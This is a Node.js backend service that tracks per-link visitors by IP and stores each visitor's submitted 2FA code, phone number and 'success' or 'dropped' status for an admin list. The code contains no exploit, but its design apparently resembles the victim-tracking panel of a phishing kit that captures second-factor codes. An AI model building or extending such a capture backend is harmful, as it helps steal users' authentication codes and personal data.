const axios = require("axios");
const DB = require("../utils/db_query");
const { v4 } = require("uuid");
const Response = require("../responses/response");
const VisitorAdminDto = require("../dtos/visitor-admin-dto");
const VisitorDto = require("../dtos/visitor-dto");

class VisitorService {
  async get(linkId, visitorId, ip) {
    const link = await DB.query("SELECT * FROM link WHERE id = ?", [
      linkId,
    ]).then((data) => data[0]);
    if (!link)
      throw Response.NotFound("Link with the same id was not found :/");
    var visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      visitor = await DB.query(
        "SELECT * FROM visitor WHERE ip = ? AND refer = ?",
        [ip, linkId]
      ).then((data) => data[0]);
    if (!visitor) {
      visitor = await DB.query(
        "INSERT INTO visitor(id, refer, timestamp, ip) VALUES(?, ?, ?, ?) RETURNING *",
        [v4(), link.id, Date.now(), ip]
      ).then((data) => data[0]);
    }

    return Response.OK(new VisitorDto(visitor));
  }

  async delete(visitorId) {
    var visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      throw Response.NotFound("Visitor with the same id was not found");
    visitor = await DB.query("DELETE FROM visitor WHERE id = ? RETURNING *", [
      visitorId,
    ]).then((data) => data[0]);
    return Response.OK(new VisitorAdminDto(visitor));
  }

  async getAll() {
    const visitors = await DB.query(
      "SELECT * FROM visitor ORDER BY timestamp DESC"
    );
    return Response.OK(visitors.map((visitor) => new VisitorAdminDto(visitor)));
  }

  async setSuccess(visitorId) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      throw Response.NotFound("Visitor with the same id was not found");
    await DB.query(
      "UPDATE visitor SET success = ?, success_timestamp = ? WHERE id = ?",
      [true, Date.now(), visitorId]
    );
  }

  async update2FA(visitorId, pass) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      throw Response.NotFound("Visitor with the same id was not found");
    await DB.query("UPDATE visitor SET twofa = ? WHERE id = ?", [
      pass,
      visitorId,
    ]);
  }

  async updatePhone(visitorId, phone) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor)
      throw Response.NotFound("Visitor with the same id was not found");
    await DB.query("UPDATE visitor SET phone = ? WHERE id = ?", [
      phone,
      visitorId,
    ]);
  }

  async setDropped(visitorId) {
    const visitor = await DB.query("SELECT * FROM visitor WHERE id = ?", [
      visitorId,
    ]).then((data) => data[0]);
    if (!visitor) throw Response.NotFound();
    return await DB.query(
      "UPDATE visitor SET dropped = ? WHERE id = ? RETURNING *",
      [true, visitorId]
    ).then((data) => data[0]);
  }
}

module.exports = new VisitorService();
